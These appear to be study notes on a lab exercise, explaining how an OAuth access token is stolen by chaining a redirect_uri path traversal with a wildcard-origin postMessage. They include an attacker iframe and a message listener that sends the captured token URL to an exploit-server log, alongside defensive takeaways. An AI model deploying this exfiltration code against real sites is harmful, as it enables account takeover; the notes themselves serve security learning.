# EXPERT: Stealing OAuth access tokens via a proxy page

https://siunam321.github.io/ctf/portswigger-labs/OAuth-Authentication/oauth-6/

This writeup describes an **OAuth token theft vulnerability** chained with a **postMessage security flaw** in a web application. Here's how it works:

## **Core Vulnerabilities**

1. **Path Traversal in OAuth `redirect_uri`** - The OAuth service doesn't properly validate the full redirect URL path, allowing directory traversal (`/oauth-callback/../post/comment/comment-form`)
2. **Unsafe `postMessage()` usage** - The comment form iframe uses `postMessage()` with  as the target origin, allowing any website to receive messages from it

## **Attack Flow**

1. **Redirect to Vulnerable Page**: The attacker modifies the OAuth `redirect_uri` to point to the comment form page (`/post/comment/comment-form`) using path traversal.
2. **OAuth Flow Completes on This Page**: When the victim authorizes the OAuth request, the access token appears in the URL fragment (`#access_token=...`) of the comment form page.
3. **JavaScript Leaks the Token**: The comment form page has JavaScript that automatically sends `window.location.href` (which contains the access token) to its parent via `postMessage()`.
4. **Attacker Captures the Token**: Since the `postMessage()` uses  target origin, the attacker's malicious page (loaded in an iframe) can listen for and capture this message containing the access token.
5. **Use the Token**: With the stolen access token, the attacker can impersonate the victim and access their data (like the API key in `/me` endpoint).

## **Why This Works**

- **Admin has active OAuth session**: The lab condition ensures the admin will have a valid session
- **Token in URL fragment**: Implicit grant type puts the token in the URL, which JavaScript can access
- **No origin validation**: The `postMessage()` accepts messages from any origin due to  wildcard
- **Path traversal bypass**: The OAuth service only validates the domain, not the full path structure

## **Key Takeaways**

1. **OAuth `redirect_uri` validation** must be strict - check the entire URL, not just the domain
2. **Never use  as target origin** in `postMessage()` - specify exact origins
3. **URL fragments containing tokens** are accessible to JavaScript on the same page
4. **Chain vulnerabilities** can turn seemingly minor issues (path traversal + unsafe postMessage) into critical security breaches

The attack essentially uses the comment form page as a **"proxy"** to leak the access token, because that page's JavaScript will inadvertently send the token (in the URL) to any listening window due to the insecure `postMessage()` implementation.

---

You're right, let me clarify the **key mechanics** that make this attack work.

## **Why Access Token Appears in URL Fragment?**

This is due to the **OAuth Implicit Grant Flow**:

1. **Normal OAuth Flow (simplified)**:
    
    ```
    User clicks "Login with OAuth"
    → Redirect to OAuth provider (/auth?client_id=...&redirect_uri=...&response_type=**token**)
    → User authenticates & approves
    → OAuth provider redirects back to redirect_uri WITH token in URL fragment
    
    ```
    
    Example redirect after authentication:
    
    ```
    <https://client-app.com/oauth-callback#access_token=eyJhbGci...&token_type=Bearer&expires_in=3600>
    
    ```
    
2. **Why Fragment?** In Implicit flow (where `response_type=token`), tokens are returned in the **URL fragment** (after `#`) rather than as query parameters because:
    - Fragments are NOT sent to the server (they stay client-side)
    - Only JavaScript on the page can read them
    - This was thought to be more secure (though this lab shows it's not)

## **The Critical JavaScript Chain**

Let's trace exactly what happens:

### **Step 1: Attacker's Malicious Page**

```html
<iframe src="<https://oauth-provider.com/auth?redirect_uri=https://client-app.com/oauth-callback/../post/comment/comment-form&>..."></iframe>

```

- Creates an iframe that starts OAuth login
- The `redirect_uri` points to comment form page via path traversal

### **Step 2: OAuth Completes in the Iframe**

After admin approves:

```
The iframe URL becomes:
<https://client-app.com/post/comment/comment-form#access_token=eyJhbGci...&token_type=Bearer>

```

**The token is now in the iframe's URL fragment!**

### **Step 3: Comment Form JavaScript AUTOMATICALLY Leaks It**

The comment form page (`/post/comment/comment-form`) has this script:

```jsx
// This runs IMMEDIATELY when page loads
parent.postMessage({type: 'onload', data: window.location.href}, '*')

```

Translation: "As soon as this page loads, send my full URL (including `#access_token=...`) to my parent window"

Since the attacker's page is the **parent** (it contains the iframe), it receives:

```
Message: {
  type: 'onload',
  data: '<https://client-app.com/post/comment/comment-form#access_token=eyJhbGci...&token_type=Bearer>'
}

```

### **Step 4: Attacker Captures the Message**

Attacker's page listens:

```jsx
window.addEventListener('message', function(e) {
    // e.data.data contains the FULL URL with token!
    fetch('/log?data=' + encodeURIComponent(e.data.data))
}, false)

```

## **Visual Timeline**

```
┌─────────────────────────────────────────────────────────────┐
│   ATTACKER'S EXPLOIT PAGE (on exploit-server.net)           │
│                                                             │
│  <iframe src="OAuth login with redirect to comment form">  │
│                                                             │
│  +-------------------------------------------------------+  │
│  |                                                       │  │
│  |  IFRAME loads OAuth provider                         │  │
│  |                                                       │  │
│  |  Admin approves → redirects to comment form          │  │
│  |  URL becomes: /comment-form#access_token=ABC123      │  │
│  |                                                       │  │
│  |  Comment form JS AUTOMATICALLY sends:                │  │
│  |  "Hey parent, my URL is ...#access_token=ABC123"     │  │
│  |                                                       │  │
│  +-------------------------------------------------------+  │
│          ↑                                                   │
│          │ (postMessage with token)                          │
│          ↓                                                   │
│  Listener captures token and sends to exploit server log     │
└─────────────────────────────────────────────────────────────┘

```

## **The "Proxy" Concept**

The comment form page becomes a **proxy** because:

1. It's a **whitelisted** page (OAuth allows redirecting to it via path traversal)
2. It has **JavaScript that automatically leaks its URL** to any parent
3. The attacker doesn't control this page, but **forces the OAuth flow to complete on it**

## **Key Insight**

The comment form's JavaScript **wasn't designed to leak tokens** - it was designed to communicate with its parent window for normal commenting functionality. But because:

1. It uses  (accepts messages from ANY origin)
2. It sends its full URL automatically
3. We can force OAuth to put tokens into its URL fragment

...it **inadvertently** becomes a token-leaking proxy.

Think of it like this: **You trick OAuth into writing a secret (token) on a whiteboard (comment form URL), and the whiteboard has a camera (JavaScript) that automatically takes a photo and mails it to anyone who asks.**

---

Excellent questions! Let me clarify these crucial points:

## **Why Does OAuth Immediately Send Token?**

The **admin already has an active session** with the OAuth provider. This is stated in the lab description: "The admin user will open anything you send from the exploit server and they **always have an active session with the OAuth service**."

So the flow is:

1. Admin visits attacker's page → loads iframe with OAuth URL
2. OAuth provider checks: "Is admin logged in?" → **YES** (always active session)
3. OAuth provider checks: "Has admin already authorized this app?" → **YES** (probably authorized previously)
4. OAuth provider immediately redirects back with token

**No manual approval needed** because:

- Already logged in to OAuth provider
- Already authorized the client application
- This is how "SSO" (Single Sign-On) works - once you approve an app, subsequent logins are automatic

It's like when you use "Login with Google" - the first time you have to approve, but afterwards it just works.

## **Why Does the Comment Page Have This JavaScript?**

The comment system uses an **iframe architecture** for modularity:

```
Post page (Parent Window)
    ↓ contains
Comment form (iframe at /post/comment/comment-form)

```

The JavaScript exists for **legitimate communication** between iframe and parent:

```jsx
// 1. When iframe loads, tell parent "I'm ready"
parent.postMessage({type: 'onload', data: window.location.href}, '*')

// 2. When user submits comment, send data to parent
function submitForm(form, ev) {
    ev.preventDefault();
    const formData = new FormData(document.getElementById("comment-form"));
    const hashParams = new URLSearchParams(window.location.hash.substr(1));
    const o = {};
    formData.forEach((v, k) => o[k] = v);
    hashParams.forEach((v, k) => o[k] = v);
    parent.postMessage({type: 'oncomment', content: o}, '*');
    form.reset();
}

```

### **Legitimate Purpose:**

1. **`onload` message**: Tells parent "I've loaded, here's my URL" - possibly so parent can adjust iframe height or track state
2. **`oncomment` message**: When user submits comment, sends form data + URL hash parameters to parent, which then POSTs to server

### **Why `window.location.href` is included:**

The comment form might need to pass **URL parameters from the hash** (like `#postId=9`) to the parent so the parent knows which post to comment on.

Example normal flow:

```
User views post #9
→ Page loads iframe: /comment-form#postId=9
→ Iframe loads, sends: "onload, URL = /comment-form#postId=9"
→ Parent knows this is for post #9
→ User types comment, clicks submit
→ Iframe sends: "oncomment, {comment: 'hi', postId: '9'}"
→ Parent POSTs to /post/comment with this data

```

## **The Security Flaw**

The developers didn't anticipate that:

1. Their comment form page could be **loaded with an OAuth token in the fragment** (not normal `postId`)
2. Their `postMessage(..., '*')` means **ANY website can listen** (not just their own parent page)
3. The `onload` message automatically sends **whatever is in the URL fragment** - including OAuth tokens!

## **The Perfect Storm**

1. **OAuth flaw**: Allows redirecting to comment page with token
2. **Comment page design**: Automatically broadcasts its URL on load
3. **postMessage misconfiguration**: Accepts messages from any origin
4. **Admin behavior**: Has persistent OAuth session (automatic token issuance)

It's like having a house with:

- A mailbox that accepts any package (OAuth accepts any redirect_uri via path traversal)
- A robot that reads package labels aloud to the street (JavaScript sends URL to any parent)
- The mailman always delivers without knocking (admin has active session)
- And the attacker knows the address (can craft the exploit)

**The script wasn't malicious** - it was just doing its job of facilitating iframe-parent communication. But combined with the OAuth vulnerability, it becomes an **inadvertent token-leaking mechanism**.

---

Great question! This is actually **a major security issue** that shouldn't normally be allowed, but it works here due to specific circumstances.

## **Why OAuth in an iFrame Is Usually Blocked**

Modern OAuth providers **block OAuth flows in iframes** for security reasons:

1. **Clickjacking risk**: Users might unknowingly authorize apps
2. **Session fixation**: Iframes can inherit parent session in unexpected ways
3. **UI confusion**: Users might not realize they're on OAuth provider's page

## **Common Protections (That Are Missing Here):**

### **1. X-Frame-Options Header**

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN

```

This tells browsers "Don't allow this page in an iframe."

**This OAuth provider doesn't set it!**

### **2. Content Security Policy (CSP)**

```
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self';

```

**Missing in this lab.**

### **3. JavaScript Frame Busting**

```jsx
if (window.top !== window.self) {
    window.top.location = window.self.location;
}

```

**Not implemented here.**

## **Why It Works in This Lab**

The lab environment is **deliberately vulnerable**. In real-world scenarios:

1. **For Implicit Flow (response_type=token)**:
    - Many OAuth providers **require** `redirect_uri` to be pre-registered and validated
    - They check `redirect_uri` **exactly** (no path traversal allowed)
    - They often add `state` parameter to prevent CSRF
2. **For Authorization Code Flow (response_type=code)**:
    - More commonly allowed in iframes (for embedded login widgets)
    - But requires client secret exchange server-side

## **The Real-World Scenario This Mimics**

This lab represents:

1. **Poorly configured OAuth provider** (missing security headers)
2. **Legacy system** that still allows iframe embedding
3. **Internal/corporate OAuth** that might be less restrictive
4. **Mobile app OAuth flow** being abused in web context

## **Why This Matters for the Attack**

Because it's in an iframe:

1. **User doesn't see the URL bar** → doesn't notice the redirect to comment page
2. **Silent authentication** happens in background
3. **Attacker controls the context** around the OAuth flow
4. **postMessage communication** works because iframe and parent can talk

## **Example of Proper OAuth Implementation**

```jsx
// OAuth provider SHOULD check:
if (window.top === window.self) {
    // Allow - this is a top-level window
} else {
    // Block - this is in an iframe
    // Option 1: Redirect top window
    window.top.location = '<https://oauth.com/auth?.>..';
    // Option 2: Show error
    document.body.innerHTML = 'Please open in new window';
}

```

## **Takeaway**

This lab combines **multiple security failures**:

1. OAuth provider allows iframe embedding ❌
2. OAuth provider allows arbitrary redirect_uri via path traversal ❌
3. Client app has insecure postMessage configuration ❌
4. Admin has persistent session (though this is normal for SSO) ⚠️

In production, **at least one** of these should be blocked, making the attack impossible. The lab shows what happens when **all defenses fail simultaneously**.

![Снимок экрана 2025-12-03 в 17.49.15.png](EXPERT%20Stealing%20OAuth%20access%20tokens%20via%20a%20proxy%20pa/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_17.49.15.png)

![Снимок экрана 2025-12-03 в 17.48.52.png](EXPERT%20Stealing%20OAuth%20access%20tokens%20via%20a%20proxy%20pa/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_17.48.52.png)